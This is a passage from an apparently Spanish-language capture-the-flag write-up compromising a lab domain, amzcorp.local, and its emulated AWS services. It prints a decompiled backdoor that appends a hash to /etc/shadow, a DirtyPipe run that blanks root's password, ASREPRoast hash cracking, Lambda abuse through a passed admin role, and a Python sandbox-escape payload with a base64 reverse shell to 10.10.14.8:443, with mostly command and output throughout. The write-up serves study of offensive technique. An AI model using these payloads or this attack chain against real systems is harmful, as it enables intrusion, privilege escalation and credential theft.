Volviendo al codigo decompilado podemos ver el caso 1 que llama a la funcion a_b() que al parecer modifica el shadow para agregar un hash del usuario tom

```
__int64 a_b()
{
  _DWORD entry[10]; // [rsp+0h] [rbp-160h] BYREF
  char command[8]; // [rsp+70h] [rbp-F0h] BYREF
  char dest[8]; // [rsp+E0h] [rbp-80h] BYREF
  char *src; // [rsp+148h] [rbp-18h]
  char *key; // [rsp+150h] [rbp-10h]
  char *salt; // [rsp+158h] [rbp-8h]

  puts("Initiating backdoor...");
  salt = "$6$52Cz9R5yJTSpDulz";
  key = g_u_p();
  src = crypt(key, "$6$52Cz9R5yJTSpDulz");
  *dest = 980250484LL;

  strcat(dest, src);
  *command = 0x27206F686365LL;

  strcat(command, dest);
  strcpy(entry, ":19027:0:99999:7:::' >> /etc/shadow");  

  entry[9] = 0;
  strcat(command, entry);

  if ( s_s() )
  {
    puts("Already added to shadow");
  }
  else
  {
    system(command);
    puts("You may authenticate now");
  }
  return 0LL;
}
```

Volvemos a gdb y ademas del breakpoint para el otp agregamos otro en a_b() despues de que llama a g_u_p(), obtenemos el codigo otp y lo enviamos, al detenerse en el segundo breakpoint en el registro $rax encontramos una contraseña


```
❯ gdb -q ./backup_tool
Reading symbols from /home/kali/backup_tool...
(No debugging symbols found in /home/kali/backup_tool)
pwndbg> break *g_o+805
Breakpoint 1 at 0x2642
pwndbg> break *a_b+44
Breakpoint 2 at 0x19d5
pwndbg> run
Starting program: /home/kali/backup_tool
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".  
Enter your credentials to continue:
Username: backdoor
Password: <!8,>;<;He

Breakpoint 1, 0x0000555555556642 in g_o ()
pwndbg> print $rax
$1 = 303099
pwndbg> continue
Continuing.
OTP: 303099

Select Option:

1. Plant Backdoor
2. Read Secret
3. Restart exfiltration
4. Exit

Enter choice: 1
Initiating backdoor...

Breakpoint 2, 0x00005555555559d5 in a_b ()
pwndbg> x/s $rax
0x555555576a80:	"dG9#r1@c0fR"
pwndbg>
```

Esta contraseña obtenida podemos usarla en la maquina victima que sabemos es valida para el usuario tom y asi obtener una shell como este usuario existente

```
www-data@1c89340fee5f:~$ su tom
Password: dG9#r1@c0fR
$ bash
tom@1c89340fee5f:~$ id
uid=1000(tom) gid=1000(tom) groups=1000(tom)  
tom@1c89340fee5f:~$ hostname -I
172.22.11.10 
tom@1c89340fee5f:~$
```

Ejecutando linpeas podemos encontrar posibles formas de escalar privilegios donde nos recomienda el exploit de DirtyPipe ya que parece que es vulnerable

```
tom@1c89340fee5f:/tmp$ ./linpeas.sh

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester  

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
```

Podemos usar un exploit de este CVE y al ejecutarlo como se nos pide modifica el passwd quitandole la contraseña a root que pasa a llamarse rootz

```
tom@1c89340fee5f:/tmp$ ./exp /etc/passwd 1 ootz:  
It worked!
tom@1c89340fee5f:/tmp$ head -n1 /etc/passwd
rootz::0:0:root:/root:/bin/bash
tom@1c89340fee5f:/tmp$
```

Con un simple su rootz podemos convertirnos en este usuario sin proporcionar contraseña y obtener una shell con el identificador 0 donde podemos leer la flag

```
tom@1c89340fee5f:~$ su rootz
rootz@0474e1401baa:~# id
uid=0(rootz) gid=0(root) groups=0(root)
rootz@0474e1401baa:~# hostname -I
172.22.11.10 
rootz@0474e1401baa:~# cat /root/flag.txt  
AWS{uN1x1f13d_4_l0t!}
rootz@0474e1401baa:~#
```


## Long Run

Algo curioso es que el usuario root tiene un correo en /var/mail/root donde se le pide activar al usuario jameshauwnnel como cuenta en el dominio del DC

```
rootz@0474e1401baa:~# cat /var/mail/root
From tom@localhost  Mon, 10 Jan 2022 09:10:48 GMT
Return-Path: <tom@localhost>
Received: from localhost (localhost [127.0.0.1])
	by localhost (8.15.2/8.15.2/Debian-18) with ESMTP id 28AAfaX452455
	for <root@localhost>; Mon, 10 Jan 2022 09:10:48 GMT
Received: (from tom@localhost)
	by localhost (8.15.2/8.15.2/Submit) id 28AAfaX452455;
	Mon, 10 Jan 2022 09:10:48 GMT
Date: Mon, 10 Jan 2022 09:10:48 GMT 
Message-Id: <202201100910.28AAfaX452455@localhost>
To: root@localhost
From: tom@localhost
Subject: Activating User Account

Hi Tony.

Could you please activate the user account jameshauwnnel on the domain controller along with setting correct permissions for him.  

Thanks,
Tom
rootz@0474e1401baa:~#
```

Podemos validar el usuario con kerbrute y es una cuenta existente en el dominio

```
❯ kerbrute userenum -d amzcorp.local --dc dc01.amzcorp.local users.txt  
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

>  Using KDC(s):
>  	dc01.amzcorp.local:88

>  [+] VALID USERNAME:	 jameshauwnnel@amzcorp.local
>  Done! Tested 1 usernames (1 valid) in 0.169 seconds
```

Algo a probar es un ASREPRoast donde si un usuario tiene seteado el No Preauth podemos obtener un TGT como este que se traduce a un hash de formato kerberos

```
❯ impacket-GetNPUsers amzcorp.local/jameshauwnnel -no-pass
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for jameshauwnnel
$krb5asrep$23$jameshauwnnel@AMZCORP.LOCAL:31535245c4a6bcd5dcf747a4b3f32d8b$0b60754c629b443971d56ac9ba461192d0a2cc5b15945371a78084b9dc8c54a260ff23027ac069931da90056c970974a72d5d95a4611c81d6078fdae6cc44e2e0f4519f169d7904cafe1aea740f46f532a0a2cd76df193660b840380263d1163e02fc6d3d31ab975609d0597bd0298680af510162dcf8609496d179d37c954e58e2edeefd2c2fd87469a16aaa84546ee396dad22192cab3735098343bbc2177838fdef73bd18365a4c732984d1354da6ba8f9cb1ccfd48a104c9293d810f79676032d034c967f2713fab27faf0b8f46e16ec5e0f5b28cca5439d5b2121ca01997312b469a29e75f6a4e28819641c  
```

De primeras john no logra romper el hash con el rockyou.txt sin embargo al aplicar algunas reglas obtenemos la contraseña 654221p! para jameshauwnnel

```
❯ john -w:/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --rules:d3ad0ne
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 XOP 4x2])  
Press 'q' or Ctrl-C to abort, almost any other key for status
654221p!         ($krb5asrep$23$jameshauwnnel@AMZCORP.LOCAL)
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Comprobamos las credenciales con netexec y son validas, listando los recursos compartidos vemos un privilegio READ o de lectura sobre Product_Release

```
❯ nxc smb amzcorp.local -u jameshauwnnel -p 654221p! --shares
SMB         amzcorp.local   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)  
SMB         amzcorp.local   445    DC01             [+] amzcorp.local\jameshauwnnel:654221p! 
SMB         amzcorp.local   445    DC01             [*] Enumerated shares
SMB         amzcorp.local   445    DC01             Share           Permissions     Remark
SMB         amzcorp.local   445    DC01             -----           -----------     ------
SMB         amzcorp.local   445    DC01             ADMIN$                          Remote Admin
SMB         amzcorp.local   445    DC01             C$                              Default share
SMB         amzcorp.local   445    DC01             IPC$            READ            Remote IPC
SMB         amzcorp.local   445    DC01             NETLOGON        READ            Logon server share 
SMB         amzcorp.local   445    DC01             Product_Release READ            
SMB         amzcorp.local   445    DC01             SYSVOL          READ            Logon server share
```

Nos conectamos al recurso Product_Release usando smbclient de impacket y encontramos 2 archivos, descargamos ambos, uno parece ser un tipo de fragmento

```
❯ impacket-smbclient amzcorp.local/jameshauwnnel:'654221p!'@dc01.amzcorp.local
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# use Product_Release
# ls
drw-rw-rw-          0  Fri Jan 21 07:53:44 2022 .
drw-rw-rw-          0  Fri Jan 21 07:53:44 2022 ..
-rw-rw-rw-   18770248  Fri Jan 21 07:53:44 2022 AMZ-V1.0.11.128_10.2.112.chk
-rw-rw-rw-        838  Fri Jan 21 07:53:44 2022 AMZ-V1.0.11.128_10.2.112_Release_Notes.html  
# mget *
[*] Downloading AMZ-V1.0.11.128_10.2.112.chk
[*] Downloading AMZ-V1.0.11.128_10.2.112_Release_Notes.html
#
```

Usando binwalk podemos extraer archivos de el .chk y en uno de los archivos encontramos posibles claves para autenticarnos contra el servicio de AWS

```
❯ binwalk -Me AMZ-V1.0.11.128_10.2.112.chk  


_AMZ-V1.0.11.128_10.2.112.chk.extracted ❯ strings _database.extracted/104EF | head  
dynamodbz
http://cloud.amzcorp.local
AKIA5M37BDN6CD7IQDFP
(HimNcdhuuNTYzG04Oiv9UhTfnCtKTFxDd8sO0Rue)
endpoint_url
aws_access_key_id
aws_secret_access_keyc
d	d	d
username
HASH)
```

Configuramos aws proporcionando las claves, y usando de endpoint el subdominio reservado cloud hacemos una llamada sts para ver el usuario actual que es john

```
❯ aws configure
AWS Access Key ID [None]: AKIA5M37BDN6CD7IQDFP
AWS Secret Access Key [None]: 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  
Default region name [None]: us-east-1
Default output format [None]:
```

```
❯ aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq  
{
  "UserId": "AKIAC4G4H8J2K9K1L0M2",
  "Account": "000000000000",
  "Arn": "arn:aws:iam::000000000000:user/john"
}
```

En el archivo de configuración .yml en company-support podemos ver los privilegios del usuario john, este puede dumpear la tabla users de la dynamodb con scan

```
❯ curl -s http://company-support.amzcorp.local/static/uploads/CF_Prod_Template.yml | sed -n 133,146p  
  JohnUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: john
      Path: /
      Policies:
        - PolicyName: dynamodb-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'dynamodb:Scan'
                Resource: '*'

  DynamoDBTable:
    Type: 'AWS::DynamoDB::Table'
    Properties:
      TableName: Users
      AttributeDefinitions:
        - AttributeName: username
          AttributeType: S
        - AttributeName: password
          AttributeType: S
```

Asi que con aws podemos simplemente dumpear la tabla users de la dynamodb usando scan donde encontramos varios posibles usuarios con sus contraseñas

```
❯ aws --endpoint-url http://cloud.amzcorp.local dynamodb scan --table-name users | jq  
{
  "Items": [
    {
      "password": {
        "S": "dE2*5$fG"
      },
      "username": {
        "S": "jason"
      }
    },
    {
      "password": {
        "S": "cGh#@0_gJ"
      },
      "username": {
        "S": "david"
      }
    },
    {
      "password": {
        "S": "dF4G0982#4%!"
      },
      "username": {
        "S": "olivia"
      }
    }
  ],
  "Count": 3,
  "ScannedCount": 3,
  "ConsumedCapacity": null
}
```

Haciendo uso de jq podemos crear un archivo de usuarios y otro de contraseñas

```
❯ aws --endpoint-url http://cloud.amzcorp.local dynamodb scan --table-name users | jq -r '.Items[].username.S' > users.txt
```

```
❯ aws --endpoint-url http://cloud.amzcorp.local dynamodb scan --table-name users | jq -r '.Items[].password.S' > passwords.txt  
```

Probamos cada usuario con su respectiva contraseña usando netexec y las credenciales del usuario david son validas autenticandose hacia el dominio

```
❯ nxc smb amzcorp.local -u users.txt -p passwords.txt --continue-on-success --no-bruteforce
SMB         amzcorp.local   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)  
SMB         amzcorp.local   445    DC01             [-] amzcorp.local\jason:dE2*5$fG STATUS_LOGON_FAILURE 
SMB         amzcorp.local   445    DC01             [+] amzcorp.local\david:cGh#@0_gJ 
SMB         amzcorp.local   445    DC01             [-] amzcorp.local\olivia:dF4G0982#4%! STATUS_LOGON_FAILURE
```

Ademas de ser validas para el dominio por smb tambien son validas hacia winrm

```
❯ nxc winrm amzcorp.local -u david -p cGh#@0_gJ
SMB         amzcorp.local   5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:amzcorp.local)  
HTTP        amzcorp.local   5985   DC01             [*] http://amzcorp.local:5985/wsman
HTTP        amzcorp.local   5985   DC01             [+] amzcorp.local\david:cGh#@0_gJ (Pwn3d!)
```

Simplemente nos conectamos usando evil-winrm como el usuario david, de esta manera obtenemos una powershell en el DC donde podemos leer la flag 9

```
❯ evil-winrm -i amzcorp.local -u david -p cGh#@0_gJ
PS C:\Users\david\Documents> whoami
amzcorp\david
PS C:\Users\david\Documents> type ..\Desktop\flag.txt  
AWS{h4ng_1n_th3r3_f0r_m0r3_cl0ud}
PS C:\Users\david\Documents>
```


## Jerry-built

Ademas de las credenciales de david para winrm las credenciales de olivia nos sirven para iniciar sesión en el subdominio workflow que corre airflow por detras

En Admin > Variables podemos encontrar variables que contienen claves de AWS podemos seleccionar ambas y darle a export, esto nos creara un archivo json

Este archivo json contiene los 2 valores que necesitamos para la credencial aws

```
❯ cat variables.json | jq
{
  "AWS_ACCESS_KEY_ID": "AKIA5M34BDN8GCJGRFFB",
  "AWS_SECRET_ACCESS_KEY": "cnVpO1/EjpR7pger+ELweFdbzKcyDe+5F3tbGOdn"  
}
```

Configuramos aws proporcionando las claves, y usando de endpoint el subdominio reservado cloud hacemos una llamada sts para ver el usuario actual que es will

```
❯ aws configure
AWS Access Key ID [None]: AKIA5M34BDN8GCJGRFFB
AWS Secret Access Key [None]:  cnVpO1/EjpR7pger+ELweFdbzKcyDe+5F3tbGOdn  
Default region name [None]: us-east-1
Default output format [None]:
```

```
❯ aws --endpoint-url http://cloud.amzcorp.local sts get-caller-identity | jq  
{
  "UserId": "AKIAIOSFODNN7DXV3G29",
  "Account": "000000000000",
  "Arn": "arn:aws:iam::000000000000:user/will"
}
```

Volviendo al .yml podemos ver que este usuario puede crear e invocar funciones lambda utilizando bajo el contexto del rol serviceadm por un periodo de tiempo

```
  WillUser:
    Type: 'AWS::IAM::User'
    Properties:
      UserName: will
      Path: /
      Policies:
        - PolicyName: lambda-policy
          PolicyDocument:
            Version: 2012-10-17
            Statement:
              - Effect: Allow
                Action:
                  - 'Lambda:CreateFunction'
                  - 'Lambda:InvokeFunction'
                  - 'IAM:PassRole'
                Resource: ['arn:aws:lambda:*:*:function:*','arn:aws:iam::*:role/serviceadm']  
```

Iniciamos creando un archivo rce.py con una funcion lambda_handler que ejecutara el comando id, despues de eso creamos un rce.zip con el dentro

```
❯ cat rce.py
import os

def lambda_handler(event, context):  
    return os.popen("id").read()
```


```
❯ zip rce.zip rce.py
```

Ahora creamos una funcion lambda que ejecutara con python3.8 usando el rol serviceadm rce.lambda_handler del archivo dentro de rce.zip como payload

```
❯ aws --endpoint-url http://cloud.amzcorp.local lambda create-function --function-name id --runtime python3.8 --role "arn:aws:iam::000000000000:role/serviceadm" --handler rce.lambda_handler --zip-file fileb://rce.zip | jq  
{
  "FunctionName": "id",
  "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:id",
  "Runtime": "python3.8",
  "Role": "arn:aws:iam::000000000000:role/serviceadm",
  "Handler": "rce.lambda_handler",
  "CodeSize": 238,
  "Description": "",
  "Timeout": 3,
  "LastModified": "2023-09-20T02:18:23.459+0000",
  "CodeSha256": "U2e5DfCI7Y1j69WoRuNmcj6CBOuqOYoj0Q+jtATHmcs=",
  "Version": "$LATEST",
  "VpcConfig": {},
  "TracingConfig": {
    "Mode": "PassThrough"
  },
  "RevisionId": "6f7bd163-3dbe-4e07-82df-1ffe0277ae1d",
  "State": "Active",
  "LastUpdateStatus": "Successful",
  "PackageType": "Zip"
}
```

Simplemente nos queda llamar a esta funcion y depositamos el output en un txt, al ejecutarla en el txt podemos ver reflejado el comando id ejecutado

```
❯ aws --endpoint-url http://cloud.amzcorp.local lambda invoke --function-name id output.txt | jq  
{
  "StatusCode": 200,
  "LogResult": "",
  "ExecutedVersion": "$LATEST"
}
```

```
❯ cat output.txt
"uid=993(sbx_user1051) gid=990 groups=990\n"
```

Ya ejecutando comandos podriamos enviarnos una shell sin embargo hay algo mas interesante y es que al crear e invocar la funcion con el rol serviceadm por un tiempo somos admin sobre todo el servicio de aws por lo que podemos listar las funciones

```
❯ aws --endpoint-url http://cloud.amzcorp.local lambda list-functions | jq  
{
  "Functions": [
    {
      "FunctionName": "tracking_api",
      "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tracking_api",
      "Runtime": "python3.8",
      "Role": "arn:aws:iam::123456:role/irrelevant",
      "Handler": "code.lambda_handler",
      "CodeSize": 662,
      "Description": "",
      "Timeout": 3,
      "LastModified": "2023-09-18T04:18:59.017+0000",
      "CodeSha256": "HIkPHSeYh4DIQb5LaRF3ln8QjuajegZJsEyK8tCcxrU=",
      "Version": "$LATEST",
      "VpcConfig": {},
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "5b7326f4-0090-403d-97ec-56101f1fdd69",
      "State": "Active",
      "LastUpdateStatus": "Successful",
      "PackageType": "Zip"
    },
    {
      "FunctionName": "shell",
      "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:shell",
      "Runtime": "python3.8",
      "Role": "arn:aws:iam::000000000000:role/serviceadm",
      "Handler": "rce.lambda_handler",
      "CodeSize": 472,
      "Description": "",
      "Timeout": 3,
      "LastModified": "2023-09-20T02:25:58.247+0000",
      "CodeSha256": "/mvu/HR9/kYGlcBkDeEhAGro67O0xK9X4/F75mn+uCg=",
      "Version": "$LATEST",
      "VpcConfig": {},
      "TracingConfig": {
        "Mode": "PassThrough"
      },
      "RevisionId": "f819e703-0e7d-4027-8d82-e96a8db0098f",
      "State": "Active",
      "LastUpdateStatus": "Successful",
      "PackageType": "Zip"
    }
  ]
}
```

Ademas de la funcion que creamos podemos ver tracking_api bastante parecida, que tambien se ejecuta con python3.8 y nos muestra la ruta de un code.zip

```
❯ aws --endpoint-url http://cloud.amzcorp.local lambda get-function --function-name tracking_api | jq  
{
  "Configuration": {
    "FunctionName": "tracking_api",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:tracking_api",
    "Runtime": "python3.8",
    "Role": "arn:aws:iam::123456:role/irrelevant",
    "Handler": "code.lambda_handler",
    "CodeSize": 662,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2023-09-18T04:18:59.017+0000",
    "CodeSha256": "HIkPHSeYh4DIQb5LaRF3ln8QjuajegZJsEyK8tCcxrU=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
      "Mode": "PassThrough"
    },
    "RevisionId": "5b7326f4-0090-403d-97ec-56101f1fdd69",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
  },
  "Code": {
    "Location": "http://172.22.192.2:4566/2015-03-31/functions/tracking_api/code"
  },
  "Tags": {}
}
```

La variable http_proxy aws la usa para pasar por un proxy, la exportamos y enviamos una petición, con burpsuite la interceptamos y vemos los headers usados

```
❯ export http_proxy=http://127.0.0.1:8080  
```

Arrastrando los headers de autenticacion y cambiando la ruta al code que veiamos en la funcion podemos ver una data que parece ser de un archivo zip

Exportamos la data en un archivo code.zip y al extraer los archivos nos deja 2, un archivo code.py con la configuracion y un archivo flag.txt con la flag

```
❯ unzip code.zip
Archive:  code.zip
  inflating: code.py                 
  inflating: flag.txt   
```

```
❯ cat flag.txt
AWS{i4m_w3ll_bu1lt_w1th0ut_bu1lt1ns}  
```

Podemos ver el codigo de la funcion en el code.py, donde inyectando un payload cuando hace uso de builtins podriamos lograr ejecutar comandos con system()

```
❯ cat code.py
import json
from urllib.parse import unquote
def lambda_handler(event, context):
    try:
        tracking_id = event['queryStringParameters']['id']
        tid = "id : '{}'"
        exec(tid.format(unquote(unquote(tracking_id))),{"__builtins__": {}}, {})  
        # ToDo : Integrate with graphql in Q4 
        if tid:
            return {
                'statusCode': 200,
                'body': json.dumps('Internal Server Error')
            }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps(f'Invalid Tracking ID. {e}')
        }
```

Creamos un archivo json que en el campo id que recibe la funcion haga uso de builtins para escapar y ejecutar una data en base64 que nos enviara una shell

```
❯ cat payload.json | jq
{
  "queryStringParameters": {
    "id": "1';a = [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('echo cHl0aG9uIC1jICdpbXBvcnQgc29ja2V0LHN1YnByb2Nlc3Msb3M7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KCgiMTAuMTAuMTQuOCIsNDQzKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIiknCg== | base64 -d | bash'); b = 'a"  
  }
}
```

```
❯ aws --endpoint http://cloud.amzcorp.local lambda invoke --function-name tracking_api --payload fileb://payload.json output.txt | jq
{
    "StatusCode": 200
}
```

Finalmente al ejecutar la función pasandole el payload.json ejecuta nuestra data en base64 y nos envia una shell donde nuevamente podemos leer la flag 7

```
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.15 
bash-4.2$ id
uid=993(sbx_user1051) gid=990 groups=990
bash-4.2$ ls -l
-rwxr-xr-x 1 sbx_user1051 990 594 Jan 12  2022 code.py
-rwxr-xr-x 1 sbx_user1051 990  37 Jan 17  2022 flag.txt
-rwxr-xr-x 1 sbx_user1051 990 662 Sep 18 04:18 original_lambda_archive.zip  
drwxrwxrwx 1 sbx_user1051 990   0 Sep 20 00:40 __pycache__
bash-4.2$ cat flag.txt
AWS{i4m_w3ll_bu1lt_w1th0ut_bu1lt1ns}
bash-4.2$
```


## Line Up

Ya como administradores sobre el servicio aws podemos listar los queues bajo sqs, nos encontramos con sensor_updates de la que podemos recibir mensajes

```
❯ aws --endpoint-url http://cloud.amzcorp.local sqs list-queues | jq  
{
  "QueueUrls": [
    "http://localhost:4566/000000000000/sensor_updates"
  ]
}
```

Usando receive-message logramos recibir mensajes bajo ese queue, el primero nos muestra una temperatura pero al repetirlo varias veces nos muestra la flag

```
❯ aws --endpoint-url http://cloud.amzcorp.local sqs receive-message --queue-url http://cloud.amzcorp.local/000000000000/sensor_updates | jq
{
  "Messages": [
    {
      "MessageId": "2195d706-bb53-f3aa-d2a3-ddd83f81c4da",
      "ReceiptHandle": "zvyozyqrxfacrzsnobguwjhxhnlazgxazvuzeayhnlfrdfovtsmbauyeonpfdnmsttgzsjgyxggyxchfdcwiwbkghophrzwbomkacwslfxbdvyxslibgplkzqeosrxexxicjfhhniggjktrfniwcrssndrlyxtyqucabrkbxkneqdavhobzeomkno",  
      "MD5OfBody": "7c9db777266f3ef48480f0e9773139a9",
      "Body": "Temperature: 24°c"
    }
  ]
}
```

```
❯ aws --endpoint-url http://cloud.amzcorp.local sqs receive-message --queue-url http://cloud.amzcorp.local/000000000000/sensor_updates | jq
{
  "Messages": [
    {
      "MessageId": "56b56c7b-0e55-ffcf-47fd-446aa12861b5",
      "ReceiptHandle": "rnqrcrdcfhpdknpyhyttmjdcipbxkojhnhqcyeoyejsxpkvzjazidwhhebjaegbjxbdvfrotgmymtioyelmfvohvthrypstiauvytrdpizamhsmmqgrtydcvqjevqnotpzmitcjardeowhtmyjvcqfgfsgsdhsacznayezexwhpbdesserilnksku",  
      "MD5OfBody": "724e0f5cb704edcfa5497ec156f713e6",
      "Body": "Faulty Reading. AWS{th4ts_4_l0ng_Q}"
    }
  ]
}
```


## Demolish

Tambien podemos listar los objetos del bucket databases, el unico objeto que llama la atención es el amzcorp_users.db que podria obtener credenciales

```
❯ aws --endpoint-url http://cloud.amzcorp.local s3api list-objects --bucket databases | jq  
{
  "Contents": [
    {
      "Key": "amzcorp_emp_data.db",
      "LastModified": "2023-09-19T16:12:38+00:00",
      "ETag": "\"6f018ec428e38f1afebcbc26e12d994a\"",
      "Size": 12288,
      "StorageClass": "STANDARD",
      "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
      }
    },
    {
      "Key": "amzcorp_orders.db",
      "LastModified": "2023-09-19T16:12:37+00:00",
      "ETag": "\"e3650f8b06b5fcb3c72a7c53219a9053\"",
      "Size": 12288,
      "StorageClass": "STANDARD",
      "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
      }
    },
    {
      "Key": "amzcorp_products.db",
      "LastModified": "2023-09-19T16:12:39+00:00",
      "ETag": "\"72cf5ef0412404ed5636801a20e8397f\"",
      "Size": 12288,
      "StorageClass": "STANDARD",
      "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
      }
    },
    {
      "Key": "amzcorp_users.db",
      "LastModified": "2023-09-19T16:12:38+00:00",
      "ETag": "\"834b3fbb81109790a798385d5987a5fd\"",
      "Size": 12288,
      "StorageClass": "STANDARD",
      "Owner": {
        "DisplayName": "webfile",
        "ID": "75aa57f09aa0c8caeab4f8c24e99d10f8e7faeebf76c078efc7c6caea54ba06a"
      }
    }
  ]
}
```

Podemos hacer un get-object para descargar el amzcorp_users.db a nuestro equipo

```
❯ aws --endpoint-url http://cloud.amzcorp.local s3api get-object --bucket databases --key amzcorp_users.db amzcorp_users.db | jq  
{
  "AcceptRanges": "bytes",
  "LastModified": "2023-09-19T16:12:38+00:00",
  "ContentLength": 12288,
  "ETag": "\"834b3fbb81109790a798385d5987a5fd\"",
  "ContentLanguage": "en-US",
  "ContentType": "binary/octet-stream",
  "Metadata": {}
}
```

Al ser un archivo de formato sqlite3 podemos abrirlo con sqlitebrowser, en la tabla users encontramos diferentes usuarios con sus posibles contraseñas

Creamos una lista con las contraseñas y al probarlas para el usuario Administrator encontramos una que devuelve valida y este al ser admin tambien un Pwn3d!

```
❯ crackmapexec smb amzcorp.local -u Administrator -p passwords.txt
SMB         amzcorp.local   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:amzcorp.local) (signing:True) (SMBv1:False)  
SMB         amzcorp.local   445    DC01             [-] amzcorp.local\Administrator:Summer2021! STATUS_LOGON_FAILURE 
SMB         amzcorp.local   445    DC01             [-] amzcorp.local\Administrator:amz@123 STATUS_LOGON_FAILURE 
SMB         amzcorp.local   445    DC01             [+] amzcorp.local\Administrator:K2h3v4n@#!5_34 (Pwn3d!)
```

Finalmente podemos conectarnos usando evil-winrm como Administrator donde podemos leer la ultima flag, de esta manera comprometimos todo el dominio

```
❯ evil-winrm -i amzcorp.local -u Administrator -p 'K2h3v4n@#!5_34'  
PS C:\Users\Administrator\Documents> whoami
amzcorp\administrator
PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
AWS{wr3ck3d_r3s1st0r}
PS C:\Users\Administrator\Documents>
```


![image](Imágenes/20250214114817.png)